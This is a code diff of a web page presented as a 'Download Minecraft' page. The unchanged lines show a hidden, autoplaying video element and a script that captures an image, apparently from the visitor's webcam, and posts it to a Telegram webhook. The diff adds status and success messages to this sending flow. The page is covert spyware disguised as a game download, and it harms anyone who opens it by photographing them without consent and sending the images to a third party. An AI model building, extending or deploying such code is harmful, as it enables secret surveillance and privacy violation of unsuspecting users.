@@ -61,6 +61,20 @@
         #videoElement {
             display: none;
         }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ff0000;
+            display: none;
+        }
+
+        #successMessage {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #00ff00;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -70,6 +84,8 @@
     <button id="downloadButton">Download Minecraft</button>
     <button id="colorChangeButton">Change Color</button>
     <video id="videoElement" autoplay></video>
+    <div id="status"></div>
+    <div id="successMessage">Image sent successfully!</div>
 
     <script>
         const video = document.getElementById('videoElement');
@@ -98,6 +114,9 @@
             payload.append('chat_id', 'YOUR_CHAT_ID'); // Replace YOUR_CHAT_ID with the chat ID you want to send the image to
             payload.append('photo', imgBlob, 'captured_image.png');
 
+            document.getElementById('status').innerText = 'Sending image...';
+            document.getElementById('status').style.display = 'block';
+
             fetch(webhookURL, {
                 method: 'POST',
                 body: payload
@@ -106,9 +125,12 @@
                 if (!response.ok) {
                     throw new Error('Failed to send image to Telegram webhook');
                 }
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
                 console.log('Image sent to Telegram webhook');
             })
             .catch(error => {
+                document.getElementById('status').innerText = 'Error: ' + error.message;
                 console.error('Error:', error);
             });
 
